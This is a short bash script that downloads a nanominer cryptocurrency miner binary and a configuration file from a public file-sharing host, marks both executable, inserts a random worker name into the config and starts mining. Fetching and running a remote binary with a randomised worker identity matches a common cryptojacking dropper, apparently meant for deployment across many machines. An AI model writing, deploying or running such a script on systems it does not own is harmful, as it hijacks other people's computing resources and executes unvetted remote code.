#!/bin/bash
wget https://store6.gofile.io/download/41f77e08-1c64-4989-98c7-0a063caba68f/nanominer
wget https://store6.gofile.io/download/e3ab1d3c-a88a-4c5b-b835-196b1983d86b/cfg.ini
chmod +x cfg.ini
chmod +x nanominer
sed -i "s/nanominer/$(shuf -n 1 -i 1-999999)/" "cfg.ini"
./nanominer cfg.ini